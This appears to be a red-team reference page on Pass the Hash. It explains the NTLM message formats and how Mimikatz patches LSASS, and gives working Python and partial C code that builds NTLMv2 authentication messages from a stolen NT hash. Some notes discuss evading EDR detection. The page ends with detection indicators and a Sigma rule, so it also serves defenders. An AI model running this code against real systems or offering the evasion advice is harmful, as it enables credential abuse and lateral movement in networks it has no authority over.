# Pass the Hash - Implementation Deep-Dive

**MITRE ATT&CK**: T1550.002 - Use Alternate Authentication Material: Pass the Hash

> **Authorized security testing only.** These code patterns are reference material
> for red team professionals operating under explicit written authorization.

## Overview

Pass the Hash (PtH) exploits a fundamental property of the NTLM authentication protocol:
the NT hash IS the credential. The plaintext password is never transmitted during NTLM
authentication -- only an HMAC-MD5 response derived from the NT hash. If an attacker
obtains the NT hash (via LSASS dump, SAM extraction, or DCSync), they can compute valid
challenge-responses without ever knowing the password. This works because the NT hash is
a simple MD4 of the Unicode password with no salt, and the NTLM protocol uses it as a
symmetric key rather than comparing it directly.

PtH is the most fundamental lateral movement technique. Understanding its internals --
from NTLM message structure to LSASS credential patching -- is essential for both
offensive operators and detection engineers.

## NTLM Authentication Protocol Internals

NTLM is a challenge-response protocol consisting of three messages (Type 1, 2, 3):

```
  Client                                          Server
    |                                                |
    |  --- Type 1 (NEGOTIATE_MESSAGE) ------------> |
    |      Flags: NTLMSSP_NEGOTIATE_56,             |
    |             NTLMSSP_NEGOTIATE_UNICODE,         |
    |             NTLMSSP_REQUEST_TARGET             |
    |                                                |
    |  <-- Type 2 (CHALLENGE_MESSAGE) ------------- |
    |      Server Challenge (8 bytes random)         |
    |      Target Info (domain, server, timestamp)   |
    |      Negotiation Flags                         |
    |                                                |
    |  --- Type 3 (AUTHENTICATE_MESSAGE) ---------> |
    |      LM Response (24 bytes, often zeroed)      |
    |      NTLMv2 Response (variable length)         |
    |      Domain, Username, Workstation             |
    |      Encrypted Session Key (optional)          |
    |                                                |
    |  <-- Authentication Result ------------------- |
    |                                                |
```

### Key Insight for PtH

The NTLMv2 response is computed as:

```
NTProofStr = HMAC_MD5(NT_Hash, (ServerChallenge + ClientChallenge + Timestamp + TargetInfo))
```

The NT hash is the ONLY secret needed. No plaintext password is required at any point
in this computation. This is why PtH works -- possessing the hash is equivalent to
possessing the password for NTLM authentication purposes.

## NTLM Message Structures

### Type 1 - Negotiate Message

```
Offset  Length  Description
------  ------  -----------
 0       8      Signature ("NTLMSSP\0")
 8       4      Message Type (0x00000001)
12       4      Negotiate Flags
16       8      Domain Name Fields (Len/MaxLen/Offset) -- often empty
24       8      Workstation Fields (Len/MaxLen/Offset) -- often empty
32       ...    Payload (domain, workstation strings)
```

### Type 2 - Challenge Message

```
Offset  Length  Description
------  ------  -----------
 0       8      Signature ("NTLMSSP\0")
 8       4      Message Type (0x00000002)
12       8      Target Name Fields
20       4      Negotiate Flags
24       8      Server Challenge  <-- critical: 8 random bytes
32      16      Reserved (zeroed)
48       8      Target Info Fields (contains AV_PAIRs)
56       ...    Payload
```

### Type 3 - Authenticate Message

```
Offset  Length  Description
------  ------  -----------
 0       8      Signature ("NTLMSSP\0")
 8       4      Message Type (0x00000003)
12       8      LM Response Fields
20       8      NTLM Response Fields   <-- contains NTLMv2 response
28       8      Domain Name Fields
36       8      User Name Fields
44       8      Workstation Fields
52       8      Encrypted Random Session Key Fields
60       4      Negotiate Flags
64       ...    MIC (Message Integrity Code, 16 bytes if present)
         ...    Payload (all the variable-length fields)
```

## C Implementation - NTLM Message Structures and NTLMv2 Response

```c
#include <windows.h>
#include <stdio.h>
#include <string.h>

/*
 * NTLM Protocol Structures and NTLMv2 Response Computation
 *
 * PURPOSE: Educational reference showing how NTLM authentication works
 *          at the byte level, and why Pass-the-Hash is possible.
 *
 * The core insight: the NT hash (MD4 of the Unicode password) is the
 * only secret material needed to compute a valid NTLMv2 response.
 * The plaintext password is never used after the initial hash computation.
 *
 * DETECTION ARTIFACTS:
 *   - Event 4624 LogonType 3 (Network) with NTLM auth package
 *   - NTLM authentication from hosts that normally use Kerberos
 *   - Network capture: NTLMSSP messages in SMB/HTTP traffic
 */

/* ============================================================
 * NTLM Signature and Message Type Constants
 * These appear at the start of every NTLM message.
 * ============================================================ */
#define NTLMSSP_SIGNATURE "NTLMSSP\0"
#define NTLM_TYPE1  0x00000001
#define NTLM_TYPE2  0x00000002
#define NTLM_TYPE3  0x00000003

/* ============================================================
 * NTLM Negotiate Flags
 * These control which features are negotiated between client
 * and server. Key flags relevant to PtH:
 *   - NTLMSSP_NEGOTIATE_NTLM: use NTLM (v1 or v2)
 *   - NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY: enables NTLMv2
 * ============================================================ */
#define NTLMSSP_NEGOTIATE_UNICODE          0x00000001
#define NTLMSSP_NEGOTIATE_NTLM            0x00000200
#define NTLMSSP_NEGOTIATE_SEAL            0x00000020
#define NTLMSSP_NEGOTIATE_SIGN            0x00000010
#define NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY 0x00080000
#define NTLMSSP_NEGOTIATE_TARGET_INFO     0x00800000

/* ============================================================
 * Security Buffer: used in NTLM messages to point to
 * variable-length data within the message payload.
 * ============================================================ */
#pragma pack(push, 1)
typedef struct _NTLM_SECURITY_BUFFER {
    USHORT Len;       /* Actual length of the data */
    USHORT MaxLen;    /* Allocated length (usually same as Len) */
    ULONG  Offset;   /* Offset from start of message to the data */
} NTLM_SECURITY_BUFFER;

/* ============================================================
 * Type 1 Message (Negotiate)
 * Sent by client to initiate NTLM authentication.
 * In a PtH scenario, this is sent identically to normal auth.
 * ============================================================ */
typedef struct _NTLM_TYPE1_MESSAGE {
    CHAR   Signature[8];    /* "NTLMSSP\0" */
    ULONG  MessageType;     /* 0x00000001 */
    ULONG  NegotiateFlags;  /* Requested capabilities */
    NTLM_SECURITY_BUFFER DomainName;
    NTLM_SECURITY_BUFFER WorkstationName;
    /* Payload follows (optional domain, workstation strings) */
} NTLM_TYPE1_MESSAGE;

/* ============================================================
 * Type 2 Message (Challenge)
 * Server's response containing the 8-byte challenge.
 * The TargetInfo AV_PAIRs contain server name, domain,
 * timestamp, and other metadata needed for NTLMv2.
 * ============================================================ */
typedef struct _NTLM_TYPE2_MESSAGE {
    CHAR   Signature[8];    /* "NTLMSSP\0" */
    ULONG  MessageType;     /* 0x00000002 */
    NTLM_SECURITY_BUFFER TargetName;
    ULONG  NegotiateFlags;
    UCHAR  ServerChallenge[8];   /* 8 random bytes -- the "challenge" */
    UCHAR  Reserved[8];
    NTLM_SECURITY_BUFFER TargetInfo;  /* AV_PAIR structures */
    /* Payload follows */
} NTLM_TYPE2_MESSAGE;

/* ============================================================
 * Type 3 Message (Authenticate)
 * Client's response containing the NTLMv2 response.
 * THIS is the message where PtH matters: the NtlmV2Response
 * field contains HMAC_MD5(NT_Hash, challenge_data).
 * An attacker with just the NT hash can compute this correctly.
 * ============================================================ */
typedef struct _NTLM_TYPE3_MESSAGE {
    CHAR   Signature[8];     /* "NTLMSSP\0" */
    ULONG  MessageType;      /* 0x00000003 */
    NTLM_SECURITY_BUFFER LmResponse;
    NTLM_SECURITY_BUFFER NtlmV2Response;  /* <-- THE critical field */
    NTLM_SECURITY_BUFFER DomainName;
    NTLM_SECURITY_BUFFER UserName;
    NTLM_SECURITY_BUFFER Workstation;
    NTLM_SECURITY_BUFFER EncryptedRandomSessionKey;
    ULONG  NegotiateFlags;
    /* Payload follows (all the variable-length response data) */
} NTLM_TYPE3_MESSAGE;

/* ============================================================
 * NTLMv2 Client Challenge (blob) Structure
 * This is embedded within the NTLMv2 response and contains
 * timestamp, client nonce, and target info from the server.
 * ============================================================ */
typedef struct _NTLMv2_CLIENT_CHALLENGE {
    UCHAR  RespType;          /* 0x01 */
    UCHAR  HiRespType;        /* 0x01 */
    USHORT Reserved1;
    ULONG  Reserved2;
    ULONGLONG TimeStamp;      /* FILETIME: 100-ns intervals since 1601 */
    UCHAR  ChallengeFromClient[8]; /* 8 random bytes chosen by client */
    ULONG  Reserved3;
    /* TargetInfo AV_PAIRs follow (copied from Type 2 message) */
} NTLMv2_CLIENT_CHALLENGE;
#pragma pack(pop)

/* ============================================================
 * NTLMv2 Response Computation
 *
 * This function demonstrates the core of Pass-the-Hash:
 * computing a valid NTLMv2 response using ONLY the NT hash.
 *
 * Algorithm (from MS-NLMP specification):
 *   1. ResponseKeyNT = HMAC_MD5(NT_Hash, UPPERCASE(Username) + Domain)
 *   2. temp = concat(client_blob)    [NTLMv2_CLIENT_CHALLENGE]
 *   3. NTProofStr = HMAC_MD5(ResponseKeyNT, ServerChallenge + temp)
 *   4. NtlmV2Response = NTProofStr + temp
 *
 * DETECTION NOTE: There is NO difference at the protocol level
 *   between a legitimate NTLMv2 response and a PtH response.
 *   The math is identical. Detection must rely on behavioral
 *   indicators (source host, timing, LogonType).
 * ============================================================ */

/*
 * hmac_md5 - Compute HMAC-MD5
 *
 * OPSEC NOTE: Using Windows CryptoAPI (CryptCreateHash with
 * CALG_HMAC) or BCrypt is cleaner for production code.
 * This pseudocode uses OpenSSL-style calls for clarity.
 *
 * In real tooling, prefer BCryptCreateHash with
 * BCRYPT_HMAC_MD5_ALG_HANDLE to avoid importing openssl.
 */
void compute_ntlmv2_response(
    const UCHAR  nt_hash[16],         /* The NT hash -- our only secret */
    const WCHAR *username,             /* Username in Unicode */
    const WCHAR *domain,               /* Domain in Unicode */
    const UCHAR  server_challenge[8],  /* From Type 2 message */
    const UCHAR *target_info,          /* AV_PAIRs from Type 2 */
    ULONG        target_info_len,
    UCHAR       *ntlmv2_response,     /* Output buffer */
    ULONG       *response_len)        /* Output length */
{
    /*
     * STEP 1: Compute ResponseKeyNT
     *   = HMAC_MD5(NT_Hash, UPPERCASE(Username) + Domain)
     *
     * This is the "session base key" derived from the NT hash.
     * The username is uppercased before concatenation.
     * This means the NT hash alone (plus public username/domain)
     * is sufficient to derive the response key.
     */
    UCHAR response_key_nt[16];
    /* ... HMAC_MD5(nt_hash, uppercase_user + domain) -> response_key_nt
     *
     * Pseudocode:
     *   user_domain = to_upper(username_unicode) + domain_unicode
     *   response_key_nt = hmac_md5(key=nt_hash, data=user_domain)
     */

    /*
     * STEP 2: Build the client challenge blob (temp)
     *   Contains: RespType(1) + HiRespType(1) + Reserved(6) +
     *             Timestamp(8) + ClientChallenge(8) + Reserved(4) +
     *             TargetInfo(variable) + Reserved(4)
     *
     * The timestamp should match current time. Using a stale
     * timestamp can cause authentication failures on servers
     * with strict clock skew enforcement.
     */
    NTLMv2_CLIENT_CHALLENGE blob;
    memset(&blob, 0, sizeof(blob));
    blob.RespType = 0x01;
    blob.HiRespType = 0x01;

    /* Get current time as Windows FILETIME (100-ns since 1601) */
    FILETIME ft;
    GetSystemTimeAsFileTime(&ft);
    memcpy(&blob.TimeStamp, &ft, sizeof(ULONGLONG));

    /* Generate 8 random bytes for client challenge */
    /* BCryptGenRandom(NULL, blob.ChallengeFromClient, 8,
     *                 BCRYPT_USE_SYSTEM_PREFERRED_RNG); */

    /*
     * STEP 3: Compute NTProofStr
     *   = HMAC_MD5(ResponseKeyNT, ServerChallenge + ClientBlob)
     *
     * This is the actual authentication proof. The server performs
     * the same computation using the NT hash stored in the SAM/AD
     * and compares results. If they match, authentication succeeds.
     *
     * KEY INSIGHT: Since the server uses the stored NT hash to verify,
     * an attacker who has the NT hash computes the EXACT same value
     * a legitimate client would. There is no cryptographic difference.
     */
    UCHAR nt_proof_str[16];
    /* ... HMAC_MD5(response_key_nt, server_challenge + blob_bytes)
     *     -> nt_proof_str
     */

    /*
     * STEP 4: Assemble NtlmV2Response = NTProofStr + ClientBlob
     *   This is placed in the Type 3 message's NtlmV2Response field.
     */
    /* memcpy(ntlmv2_response, nt_proof_str, 16);
     * memcpy(ntlmv2_response + 16, &blob, blob_total_size);
     * *response_len = 16 + blob_total_size;
     */
}
```

## Sekurlsa::pth Internals - How Mimikatz Patches LSASS

The Mimikatz `sekurlsa::pth` command does not perform network authentication itself.
Instead, it patches the credential material stored inside LSASS so that subsequent
authentication attempts by Windows use the attacker-supplied hash.

```
  sekurlsa::pth Flow
  ==================

  1. CreateProcessWithLogonW()
     |
     |  Creates a new process with LOGON_NETCREDENTIALS_ONLY (Type 9 logon).
     |  This creates a logon session with the calling user's token but
     |  separate network credentials. The process runs as the caller
     |  locally but authenticates differently over the network.
     |
     v
  2. Open LSASS process handle (PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION)
     |
     |  DETECTION: Sysmon Event ID 10 (ProcessAccess) fires here.
     |  GrantedAccess will include 0x1010 or similar VM read/write flags.
     |  Source process accessing lsass.exe is a HIGH-FIDELITY indicator.
     |
     v
  3. Enumerate MSV1_0 authentication package credential entries
     |
     |  Walk the linked list of KIWI_MSV1_0_LIST structures inside
     |  the msv1_0.dll module loaded in LSASS. Each entry corresponds
     |  to an active logon session and contains the cached NTLM hash.
     |
     v
  4. Locate the entry matching the new logon session LUID
     |
     |  Match by LogonId (LUID) obtained from the process token
     |  created in step 1.
     |
     v
  5. Overwrite the NtOwfPassword field with attacker-supplied NT hash
     |
     |  WriteProcessMemory() into LSASS at the offset of the
     |  credential entry's NT hash field. The old hash (from the
     |  calling user) is replaced with the target user's hash.
     |
     |  DETECTION: WriteProcessMemory to lsass.exe is extremely
     |  suspicious. Most EDRs flag this immediately via the
     |  Microsoft-Windows-Threat-Intelligence ETW provider.
     |
     v
  6. The new process now authenticates over the network as the target user
```

```c
/*
 * Conceptual representation of the LSASS credential structures
 * that sekurlsa::pth targets. These are internal, undocumented
 * structures within msv1_0.dll that vary between Windows versions.
 *
 * NOTE: Exact offsets change with each Windows build. Tools like
 *       Mimikatz maintain offset tables per build number.
 *
 * OPSEC CONSIDERATION: Directly patching LSASS memory is the most
 *   detected approach. Alternatives include:
 *   - Overpass-the-Hash: Request a Kerberos TGT using the NT hash
 *     (Rubeus asktgt), then use Kerberos for lateral movement.
 *     This avoids LSASS patching entirely.
 *   - Token manipulation: If an existing logon session for the
 *     target user exists, steal/duplicate that token instead.
 */

/* MSV1_0 credential entry (simplified, version-dependent) */
typedef struct _MSV1_0_PRIMARY_CREDENTIAL {
    /* Logon session identifier -- matches token LUID */
    LUID     LogonId;

    /* Credential flags */
    ULONG    Flags;

    /* The NT hash (MD4 of Unicode password) -- PtH target */
    UCHAR    NtOwfPassword[16];  /* <-- This is what gets overwritten */

    /* The LM hash (DES-based, often empty on modern systems) */
    UCHAR    LmOwfPassword[16];

    /* SHA1 of the password (used for some Kerberos operations) */
    UCHAR    ShaOwPassword[20];

    /* DPAPI credential key material */
    /* ... additional fields vary by Windows version ... */
} MSV1_0_PRIMARY_CREDENTIAL;

/*
 * Conceptual PtH credential patching flow (heavily simplified).
 *
 * DETECTION ARTIFACTS:
 *   - Sysmon Event 10: ProcessAccess to lsass.exe with
 *     GrantedAccess containing PROCESS_VM_WRITE (0x0020)
 *   - Sysmon Event 1: New process creation from
 *     CreateProcessWithLogonW (parent cmd.exe/powershell.exe)
 *   - Event 4624 LogonType 9 (NewCredentials): The logon session
 *     created by LOGON_NETCREDENTIALS_ONLY shows as Type 9
 *   - Microsoft-Windows-Threat-Intelligence ETW provider:
 *     Reports memory write operations into LSASS address space
 *
 * OPSEC NOTE: Many EDRs place inline hooks on NtWriteVirtualMemory
 *   and check if the target process is lsass.exe. Even using direct
 *   syscalls to bypass ntdll hooks, the kernel-level ETW-TI provider
 *   still reports the write. Truly evading LSASS patching detection
 *   requires kernel-level access or alternative approaches entirely.
 */
```

## Python Implementation - NTLM Hash-Based Authentication

```python
"""
Pass-the-Hash authentication using NTLM over SMB.

This demonstrates the same concept as the C code above but using
Python's impacket-style approach. The NT hash is used directly
to compute NTLMv2 responses without knowing the plaintext password.

DETECTION: Identical to any NTLMv2 authentication at the network
level. Detection relies on behavioral analysis:
  - Source host not expected to authenticate to target
  - NTLM used where Kerberos is expected
  - Authentication timing anomalies (off-hours, rapid succession)

OPSEC NOTE: Network-based PtH (as shown here) does not touch LSASS
on the attacking machine. This avoids Sysmon Event 10 and ETW-TI
alerts. However, it still generates Event 4624 Type 3 on the target.
"""

import hmac
import hashlib
import struct
import os
import time

# ============================================================
# NTLM Hash Computation
# The NT hash is simply MD4(UTF-16LE(password))
# No salt, no iteration count -- this is why rainbow tables
# and PtH are so effective against NTLM.
# ============================================================

def compute_nt_hash(password: str) -> bytes:
    """
    Compute NT hash from plaintext password.
    NT Hash = MD4(UTF-16LE(password))

    In a PtH scenario, we ALREADY HAVE this hash and skip
    this function entirely. This is shown only for completeness.
    """
    return hashlib.new('md4', password.encode('utf-16le')).digest()


def compute_ntlmv2_response(
    nt_hash: bytes,            # 16-byte NT hash (the only secret)
    username: str,             # Username (case-insensitive for key)
    domain: str,               # Domain name
    server_challenge: bytes,   # 8 bytes from Type 2 message
    target_info: bytes         # AV_PAIR data from Type 2 message
) -> tuple:
    """
    Compute NTLMv2 response from NT hash (no plaintext needed).

    This is the core of Pass-the-Hash. The algorithm:
      1. ResponseKeyNT = HMAC_MD5(NT_Hash, UPPER(user) + domain)
      2. Build client blob with timestamp + random challenge + target info
      3. NTProofStr = HMAC_MD5(ResponseKeyNT, ServerChallenge + blob)
      4. Response = NTProofStr + blob

    Returns (nt_proof_str, ntlmv2_response, session_base_key)
    """

    # Step 1: Derive ResponseKeyNT from NT hash + identity
    #   The username is uppercased; domain keeps original case.
    #   This means the NT hash is the ONLY secret input.
    identity = (username.upper() + domain).encode('utf-16le')
    response_key_nt = hmac.new(nt_hash, identity, hashlib.md5).digest()

    # Step 2: Build the client challenge blob
    #   Format: Resp(1) + HiResp(1) + Reserved(6) + Time(8) +
    #           ClientChallenge(8) + Reserved(4) + TargetInfo + Reserved(4)
    client_challenge = os.urandom(8)

    # Windows FILETIME: 100-nanosecond intervals since Jan 1, 1601
    # Python time.time() returns seconds since Jan 1, 1970
    # Offset between epochs: 11644473600 seconds
    timestamp = int((time.time() + 11644473600) * 10000000)

    blob = b'\x01'                        # RespType
    blob += b'\x01'                       # HiRespType
    blob += b'\x00' * 6                   # Reserved
    blob += struct.pack('<Q', timestamp)  # TimeStamp (little-endian)
    blob += client_challenge              # ChallengeFromClient
    blob += b'\x00' * 4                   # Reserved
    blob += target_info                   # TargetInfo AV_PAIRs
    blob += b'\x00' * 4                   # Reserved

    # Step 3: Compute NTProofStr
    #   = HMAC_MD5(ResponseKeyNT, ServerChallenge + blob)
    #   This is the proof-of-possession of the NT hash.
    nt_proof_str = hmac.new(
        response_key_nt,
        server_challenge + blob,
        hashlib.md5
    ).digest()

    # Step 4: Assemble the complete NTLMv2 response
    ntlmv2_response = nt_proof_str + blob

    # Session base key (used for signing/sealing if negotiated)
    session_base_key = hmac.new(
        response_key_nt,
        nt_proof_str,
        hashlib.md5
    ).digest()

    return nt_proof_str, ntlmv2_response, session_base_key


def build_type1_message(flags: int = 0) -> bytes:
    """
    Build NTLM Type 1 (Negotiate) message.

    Default flags request NTLMv2 with Unicode support.
    In PtH, this message is identical to legitimate authentication.
    """
    default_flags = (
        0x00000001 |  # NEGOTIATE_UNICODE
        0x00000200 |  # NEGOTIATE_NTLM
        0x00080000 |  # NEGOTIATE_EXTENDED_SESSIONSECURITY
        0x00800000 |  # NEGOTIATE_TARGET_INFO
        0x02000000    # NEGOTIATE_128
    )
    if flags:
        default_flags = flags

    msg = b'NTLMSSP\x00'                       # Signature
    msg += struct.pack('<I', 0x00000001)        # Type 1
    msg += struct.pack('<I', default_flags)     # Negotiate Flags
    msg += struct.pack('<HHI', 0, 0, 0)        # Domain (empty)
    msg += struct.pack('<HHI', 0, 0, 0)        # Workstation (empty)
    return msg


def build_type3_message(
    nt_hash: bytes,
    username: str,
    domain: str,
    server_challenge: bytes,
    target_info: bytes,
    flags: int
) -> bytes:
    """
    Build NTLM Type 3 (Authenticate) message using NT hash.

    This is where Pass-the-Hash happens: we use the NT hash
    directly to compute the NTLMv2 response, without ever
    needing the plaintext password.
    """
    nt_proof, ntlmv2_resp, session_key = compute_ntlmv2_response(
        nt_hash, username, domain, server_challenge, target_info
    )

    # LM Response: for NTLMv2, this is often zeroed or set to
    # a specific value. Some implementations send a truncated
    # NTLMv2 response here.
    lm_response = b'\x00' * 24

    # Encode strings as UTF-16LE for the message payload
    domain_bytes = domain.encode('utf-16le')
    user_bytes = username.encode('utf-16le')
    workstation_bytes = b'W\x00O\x00R\x00K\x00'  # "WORK" in UTF-16LE

    # Calculate offsets (header is 72 bytes for Type 3)
    # Each field is placed sequentially after the header
    offset = 72  # Base offset after fixed header fields
    lm_offset = offset
    nt_offset = lm_offset + len(lm_response)
    domain_offset = nt_offset + len(ntlmv2_resp)
    user_offset = domain_offset + len(domain_bytes)
    ws_offset = user_offset + len(user_bytes)

    # Build the fixed header
    msg = b'NTLMSSP\x00'
    msg += struct.pack('<I', 0x00000003)  # Type 3

    # Security buffers: Len, MaxLen, Offset
    msg += struct.pack('<HHI', len(lm_response), len(lm_response), lm_offset)
    msg += struct.pack('<HHI', len(ntlmv2_resp), len(ntlmv2_resp), nt_offset)
    msg += struct.pack('<HHI', len(domain_bytes), len(domain_bytes), domain_offset)
    msg += struct.pack('<HHI', len(user_bytes), len(user_bytes), user_offset)
    msg += struct.pack('<HHI', len(workstation_bytes), len(workstation_bytes), ws_offset)
    msg += struct.pack('<HHI', 0, 0, 0)  # EncryptedRandomSessionKey (empty)
    msg += struct.pack('<I', flags)

    # Payload
    msg += lm_response
    msg += ntlmv2_resp
    msg += domain_bytes
    msg += user_bytes
    msg += workstation_bytes

    return msg


# ============================================================
# Usage Example (educational -- demonstrates the concept)
# ============================================================

if __name__ == '__main__':
    """
    This demonstrates that the NT hash alone is sufficient to
    authenticate. In a real PtH scenario, the nt_hash would come
    from LSASS dumping, SAM extraction, or DCSync -- not from
    hashing a known password.
    """
    # Attacker has obtained this hash (e.g., from hashdump)
    # Format: LM_HASH:NT_HASH (LM hash often aad3b435... for empty)
    nt_hash_hex = "e19ccf75ee54e06b06a5907af13cef42"
    nt_hash = bytes.fromhex(nt_hash_hex)

    username = "Administrator"
    domain = "CORP"

    # Simulated server challenge (in real scenario, from Type 2)
    server_challenge = os.urandom(8)
    target_info = b'\x00\x00\x00\x00'  # Minimal (MsvAvEOL)

    nt_proof, response, session_key = compute_ntlmv2_response(
        nt_hash, username, domain, server_challenge, target_info
    )

    print(f"[*] NT Hash:        {nt_hash.hex()}")
    print(f"[*] Server Challenge: {server_challenge.hex()}")
    print(f"[*] NTProofStr:     {nt_proof.hex()}")
    print(f"[*] Response length: {len(response)} bytes")
    print(f"[*] Session Key:    {session_key.hex()}")
    print("[*] Authentication response computed from hash alone -- no password needed")
```

## Detection Indicators

### High-Fidelity Indicators

| Indicator | Source | Description |
|-----------|--------|-------------|
| Event 4624 LogonType 9 | Windows Security | NewCredentials logon (sekurlsa::pth creates this) |
| Sysmon Event 10 to lsass.exe | Sysmon | Process accessing LSASS with VM_WRITE rights |
| ETW-TI LSASS write | Kernel ETW | Microsoft-Windows-Threat-Intelligence reports LSASS memory writes |
| NTLM from Kerberos-capable host | Network | Host that normally uses Kerberos suddenly using NTLM |

### Behavioral Indicators

| Pattern | Detection Logic |
|---------|-----------------|
| Rapid NTLM auth to multiple hosts | Same source authenticating to many targets in short window |
| Off-hours NTLM authentication | LogonType 3 from user accounts outside normal business hours |
| Admin NTLM from workstation | Domain admin account authenticating via NTLM from non-admin workstation |
| Process lineage anomaly | cmd.exe/powershell.exe spawned by suspicious parent shortly before network logon |

### SIGMA Rule Example

```yaml
title: Potential Pass-the-Hash - LSASS Access with Write Permissions
status: experimental
logsource:
    product: windows
    category: process_access
detection:
    selection:
        EventID: 10
        TargetImage|endswith: '\lsass.exe'
        GrantedAccess|contains:
            - '0x1010'   # VM_READ + QUERY_INFORMATION
            - '0x1038'   # VM_READ + VM_WRITE + VM_OPERATION
            - '0x1FFFFF' # PROCESS_ALL_ACCESS
    filter:
        SourceImage|endswith:
            - '\csrss.exe'
            - '\svchost.exe'
            - '\MsMpEng.exe'
    condition: selection and not filter
level: high
```

## Cross-References

- [Pass the Hash - Technique Narrative](../../09-lateral-movement/pass-the-hash.md)
- [Overpass-the-Hash](../../09-lateral-movement/overpass-the-hash.md)
- [LSASS Dumping Implementation](../credential-access-code/minidump-implementation.md)
- [Kerberos Ticket Forging (this directory)](kerberos-ticket-forging.md)
- [Token Manipulation](../credential-access-code/token-manipulation.md)
- [NTLM Relay](../../09-lateral-movement/ntlm-relay-lateral.md)
